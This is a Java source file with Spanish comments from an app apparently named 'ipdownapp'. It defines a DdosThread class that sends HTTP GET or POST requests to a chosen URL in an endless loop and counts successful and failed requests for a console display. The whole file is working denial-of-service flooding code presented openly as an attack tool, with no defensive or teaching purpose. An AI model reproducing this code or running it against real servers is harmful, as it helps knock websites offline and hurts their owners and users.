package com.example.ipdownapp.atack_tools;

import com.example.ipdownapp.models.ConsoleStateQueue;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Hilo encargado de realizar peticiones en bucle y notificar al notificador
 * que es la cola de mensajes que actualiza la terminal.
 */
public class DdosThread extends Thread{

    private final int TIEMPO_ESPERA_LECTURA_SOCKET = 10000;

    private static String POST_Method = "POST";
    private static String GET_Method = "GET";

    private static int autoId = 0;

    private int id;

    private ConsoleStateQueue colaDatos;

    private volatile boolean run;

    private String request;
    private URL url;
    private RequestMethods metodo;

    public DdosThread(RequestMethods metodo, ConsoleStateQueue colaDatos){
        this.colaDatos = colaDatos;
        this.id = ++autoId;
        this.metodo = metodo;
        run = true;
    }

    public void setRequestURL(String request) {
        this.request = request;
        try{
            this.url = new URL(request);
        }catch (Exception e){
            System.out.println(e.getMessage());
        }
    }

    @Override
    public void run() {
        while (run) {
            try {
                attack();
            } catch (IOException e) {
                System.out.println(e.getMessage());
                colaDatos.incPeticionesErroneas();
            }
        }
    }

    public void attack() throws IOException {
        HttpURLConnection connection = null;
        OutputStream out = null;
        InputStream in = null;
        StringBuilder respuesta = new StringBuilder();

        //Creamos un objeto connection
        connection = (HttpURLConnection) this.url.openConnection();
        connection.setReadTimeout(TIEMPO_ESPERA_LECTURA_SOCKET);
        connection.setUseCaches(false);
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setUseCaches(false);

        //escogemos el metodo de envio
        switch(metodo) {
            case GET:
                connection.setRequestMethod(GET_Method);
            break;
            case POST:
                connection.setRequestMethod(POST_Method);
                break;
            default:
                connection.setRequestMethod(GET_Method);
                break;
        }

        connection.setDoInput(true);
        connection.setDoOutput(true);

        String cadena = "";
        byte[] data = cadena.getBytes("utf-8");

        out = connection.getOutputStream();
        out.write(data);
        out.close();

        in = connection.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line = null;

        while ((line = reader.readLine()) != null) {
            respuesta.append(line);
        }

        if (out != null) out.close();

        if (in != null) in.close();

        if (connection != null) connection.disconnect();

        colaDatos.incPeticionesExitosas();

    }

    public boolean isRun() {
        return run;
    }

    public void setRun(boolean run) {
        this.run = run;
    }
}
